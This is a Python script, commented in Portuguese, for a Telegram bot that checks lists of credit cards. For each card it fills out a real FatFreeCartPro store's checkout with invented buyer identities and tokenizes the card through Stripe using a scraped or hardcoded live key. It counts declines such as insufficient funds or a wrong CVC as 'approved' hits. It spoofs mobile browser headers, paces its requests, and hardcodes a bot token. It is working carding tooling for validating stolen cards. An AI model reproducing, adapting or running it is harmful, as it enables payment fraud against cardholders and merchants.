import requests
import json
import time
import sys
import re
import uuid
import random
import base64
from urllib.parse import urlparse, parse_qs
import telebot

# ==============================================================================
#  FATFREECARTPRO + STRIPE — CHECKER BOT TELEGRAM
# ==============================================================================

# TOKEN DO SEU BOT TELEGRAM
TELEGRAM_BOT_TOKEN = '8806372148:AAG5KvpIAcO97IM-A00DfznguWu5eQ5qGp0'
bot = telebot.TeleBot(TELEGRAM_BOT_TOKEN)

# Cores ANSI Chamativas (para logs locais, se necessário)
GREEN  = "\033[1;92m"
RED    = "\033[1;91m"
YELLOW = "\033[1;93m"
BLUE   = "\033[1;94m"
MAGENTA= "\033[1;95m"
CYAN   = "\033[1;96m"
WHITE  = "\033[1;97m"
RESET  = "\033[0m"
BOLD   = "\033[1m"

def generate_full_identity():
    """Gera um perfil completo de identidade para preencher formulários"""
    first_names = ["Guilherme", "Rodrigo", "Felipe", "Lucas", "Gabriel", "Mateus", "Bruno", "Tiago", "Rafael", "Leonardo"]
    last_names  = ["Souza", "Silva", "Santos", "Oliveira", "Pereira", "Lima", "Costa", "Ferreira", "Rodrigues", "Almeida"]
    domains     = ["gmail.com", "outlook.com", "hotmail.com", "yahoo.com", "icloud.com"]
    
    addresses = [
        {"street": "1050 S Flower St", "city": "Los Angeles", "state": "CA", "zip": "90015"},
        {"street": "233 S Wacker Dr", "city": "Chicago", "state": "IL", "zip": "60606"},
        {"street": "1097 Howard St", "city": "San Francisco", "state": "CA", "zip": "94103"},
        {"street": "1720 2nd Ave", "city": "New York", "state": "NY", "zip": "10128"},
        {"street": "2101 4th Ave", "city": "Seattle", "state": "WA", "zip": "98121"}
    ]
    
    first = random.choice(first_names)
    last  = random.choice(last_names)
    addr  = random.choice(addresses)
    email = f"{first.lower()}.{last.lower()}{random.randint(100, 9999)}@{random.choice(domains)}"
    phone = f"+1{random.randint(200, 999)}{random.randint(200, 999)}{random.randint(1000, 9999)}"
    
    return {
        "first_name": first, "last_name": last, "full_name": f"{first} {last}",
        "email": email, "phone": phone, "company": f"{last} Solutions Inc.",
        "address": addr["street"], "city": addr["city"], "state": addr["state"],
        "zip": addr["zip"], "country": "US"
    }

# Retornos que devem ser tratados como APROVADO
APPROVED_INDICATORS = [
    "Your card\'s security code is incorrect.",
    "incorrect_cvc",
    "AuthorizeResult",
    "Approved",
    "Transaction Authorized",
    "succeeded",
    "authorized",
    "requires_capture",
    "processing",
    "pass",
    "insufficient_funds"
]

def is_approved_response(response_text):
    """Verifica se a resposta contém algum indicador de aprovação"""
    for indicator in APPROVED_INDICATORS:
        if indicator.lower() in response_text.lower():
            return True
    return False

def extract_ids_from_url(url):
    try:
        # Tenta extrair cl e i da URL
        parsed = urlparse(url)
        query_params = parse_qs(parsed.query)
        cl = query_params.get("cl", [None])[0]
        i = query_params.get("i", [None])[0]
        return cl, i
    except: return None, None

def process_payment(card_data, target_url, index, chat_id):
    client_id, item_id = extract_ids_from_url(target_url)
    if not client_id or not item_id:
        bot.send_message(chat_id, f"❌ Erro: Não foi possível extrair cl ou i da URL {target_url}")
        return

    identity = generate_full_identity()
    try:
        cc_num, cc_month, cc_year, cc_cvv = card_data.strip().split("|")
        if len(cc_year) == 2:
            cc_year = "20" + cc_year
    except:
        bot.send_message(chat_id, f"❌ Formato de cartão inválido: {card_data}")
        return

    session = requests.Session()
    ua = "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36"

    try:
        # --- PASSO 1: ADICIONAR AO CARRINHO E INICIALIZAR ---
        headers_1 = {
            'authority': 'www.fatfreecartpro.com',
            'accept': '*/*',
            'accept-language': 'pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
            'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': ua
        }
        
        init_url = f"https://www.fatfreecartpro.com/ecom/gbv3.php?c=cart&ejc=2&cl={client_id}&i={item_id}&add=1&initialize=1"
        resp_init = session.get(init_url, headers=headers_1, timeout=30, allow_redirects=True)
        
        cart_id_match = re.search(r'cart_id["\"]?\s*[:=]\s*["\"]?(\d+)', resp_init.text)
        cart_md5_match = re.search(r'cart_md5["\"]?\s*[:=]\s*["\"]?([a-f0-9]{32})', resp_init.text)
        
        if not cart_id_match: cart_id_match = re.search(r'cart_id=(\d+)', resp_init.url)
        if not cart_md5_match: cart_md5_match = re.search(r'cart_md5=([a-f0-9]{32})', resp_init.url)
        
        if cart_id_match and cart_md5_match:
            cart_id = cart_id_match.group(1)
            cart_md5 = cart_md5_match.group(1)
        else:
            cart_id = session.cookies.get('ej_cart_id')
            cart_md5 = session.cookies.get('ej_cart_md5')
            if not cart_id: 
                bot.send_message(chat_id, f"❌ Erro: Falha ao gerar cart_id para {card_data.strip()}")
                return
                
        referer_url = f"https://www.fatfreecartpro.com/ecom/ccv3/?client_id={client_id}&cart_id={cart_id}&cart_md5={cart_md5}&page_ln=en&initialize"

        stripe_init_url = f"https://www.fatfreecartpro.com/ecom/ccv3/assets-php/Stripe/stripe_initialize.php?client_id={client_id}&cart_id={cart_id}&cart_md5={cart_md5}"
        resp_stripe_init = session.get(stripe_init_url, headers=headers_1, timeout=15)
        
        pk_match = re.search(r'pk_live_[a-zA-Z0-9]+', resp_stripe_init.text)
        acc_match = re.search(r'acct_[a-zA-Z0-9]+', resp_stripe_init.text)
        
        if not pk_match:
            resp_checkout = session.get(referer_url, headers=headers_1, timeout=15)
            pk_match = re.search(r'pk_live_[a-zA-Z0-9]+', resp_checkout.text)
            acc_match = re.search(r'acct_[a-zA-Z0-9]+', resp_checkout.text)

        stripe_pk = pk_match.group(0) if pk_match else 'pk_live_UUFYTQ63roIxScFWo9jLfco5'
        stripe_acc = acc_match.group(0) if acc_match else 'acct_1NMRCgJG5BoI6HHT'

        # --- PASSO 2: REGISTRAR ATIVIDADE ---
        headers_act = {
            'authority': 'www.fatfreecartpro.com',
            'accept': '*/*',
            'accept-language': 'pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://www.fatfreecartpro.com',
            'referer': referer_url,
            'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': ua
        }
        
        data_act = f"&cart_id={cart_id}&same_s_b=0&b_email={identity['email']}&b_name={identity['full_name']}&b_company=&b_address1={identity['address']}&b_address2=&b_city={identity['city']}&b_country=US&b_state={identity['state']}&b_postcode={identity['zip']}&b_phone={identity['phone']}&s_name={identity['full_name']}&s_company=&s_address1={identity['address']}&s_address2=&s_city={identity['city']}&s_country=US&s_state={identity['state']}&s_postcode={identity['zip']}&s_phone={identity['phone']}&payment_initiated=false&save_activity=1"
        
        try:
            session.post('https://www.fatfreecartpro.com/ecom/cc_activity.php', headers=headers_act, data=data_act, timeout=15)
        except: pass

        # --- PASSO 3: TOKENIZAÇÃO STRIPE ---
        muid = str(uuid.uuid4())
        sid = str(uuid.uuid4())
        guid = str(uuid.uuid4())
        
        headers_stripe = {
            'authority': 'api.stripe.com',
            'accept': 'application/json',
            'accept-language': 'pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'referer': 'https://js.stripe.com/',
            'user-agent': ua
        }
        
        data_stripe = {
            'type': 'card',
            'card[number]': cc_num,
            'card[cvc]': cc_cvv,
            'card[exp_month]': cc_month,
            'card[exp_year]': cc_year[2:] if len(cc_year) == 4 else cc_year,
            'guid': guid,
            'muid': muid,
            'sid': sid,
            'payment_user_agent': 'stripe.js/dff4dfe338; stripe-js-v3/dff4dfe338; card-element',
            'referrer': 'https://www.fatfreecartpro.com',
            'time_on_page': random.randint(100000, 200000),
            'key': stripe_pk,
            '_stripe_account': stripe_acc
        }
        
        resp_stripe = session.post('https://api.stripe.com/v1/payment_methods', headers=headers_stripe, data=data_stripe, timeout=25)
        
        if resp_stripe.status_code != 200:
            err_msg = resp_stripe.json().get('error', {}).get('message', 'Erro Stripe')
            bot.send_message(chat_id, f"❌ Reprovado (Stripe) ➔ {card_data.strip()} ➔ {err_msg}")
            return
            
        pm_id = resp_stripe.json().get('id')

        # --- PASSO 4: CHECKOUT FINAL ---
        headers_val = {
            'authority': 'www.fatfreecartpro.com',
            'accept': '*/*',
            'accept-language': 'pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
            'content-type': 'application/json',
            'origin': 'https://www.fatfreecartpro.com',
            'referer': referer_url,
            'user-agent': ua
        }
        
        payload_val = {
            "payment_method_id": pm_id,
            "cart_id": cart_id,
            "cart_md5": cart_md5,
            "first_name": identity['first_name'],
            "last_name": identity['last_name'],
            "email": identity['email']
        }
        
        resp_val = session.post('https://www.fatfreecartpro.com/ecom/ccv3/assets-php/Stripe/stripeValidate.php', headers=headers_val, json=payload_val, timeout=35)
        
        try:
            resp_json = resp_val.json()
            resp_text = json.dumps(resp_json)
            site_msg = resp_json.get('message') or resp_json.get('error') or resp_json.get('msg') or resp_text
        except:
            resp_text = resp_val.text
            site_msg = resp_text

        card_str = f"{cc_num}|{cc_month}|{cc_year}|{cc_cvv}"

        if is_approved_response(resp_text):
            bot.send_message(chat_id, f"✅ Aprovado ➔ {card_str} ➔ {site_msg}")
        else:
            bot.send_message(chat_id, f"❌ Reprovado ➔ {card_str} ➔ {site_msg}")

    except Exception as e:
        bot.send_message(chat_id, f"⚠️ Erro de Conexão ➔ {card_data.strip()} ➔ {str(e)}")

# Exemplo de URL de produto (baseado no request: cl=373253, i=1781166)
LISTA_PRODUTOS = [
    "https://www.fatfreecartpro.com/ecom/gbv3.php?c=cart&ejc=2&cl=373253&i=1781166",
]

@bot.message_handler(commands=['start', 'help'])
def send_welcome(message):
    bot.reply_to(message, "Olá! Envie-me uma lista de cartões (um por linha) para eu verificar. Ex: `NUMERO|MES|ANO|CVV`")

@bot.message_handler(func=lambda message: True)
def handle_cards(message):
    chat_id = message.chat.id
    input_cards = message.text.strip().split('\n')
    
    if not input_cards or not any(card.strip() for card in input_cards):
        bot.send_message(chat_id, "Por favor, envie uma lista de cartões válida (um por linha).")
        return

    bot.send_message(chat_id, f"[* ] Iniciando testes em {len(input_cards)} cartões...")
    
    for index, card in enumerate(input_cards):
        if card.strip(): # Ignora linhas vazias
            produto_atual = LISTA_PRODUTOS[index % len(LISTA_PRODUTOS)]
            process_payment(card, produto_atual, index + 1, chat_id)
            time.sleep(4) # Delay maior para segurança
            
    bot.send_message(chat_id, "🏁 Processamento finalizado.")

if __name__ == "__main__":
    print(MAGENTA + "\n" + "═══════════════════════════════════════════════════════════════════════════")
    print(BOLD + CYAN + base64.b64decode("ICAg8J+agCAgQEFCT0JPUkFTVVBPUlRFIOKAlCBDSEVDS0VSICBGQVRGUkVFQ0FSVFBSTyAoUk9UQUzDk08pICDwn5qAICAg").decode('utf-8') + RESET)
    print(MAGENTA + "═══════════════════════════════════════════════════════════════════════════" + RESET)
    print(YELLOW + "\n🤖 Bot do Telegram iniciado! Envie cartões para ele.\n" + RESET)
    bot.polling(none_stop=True)
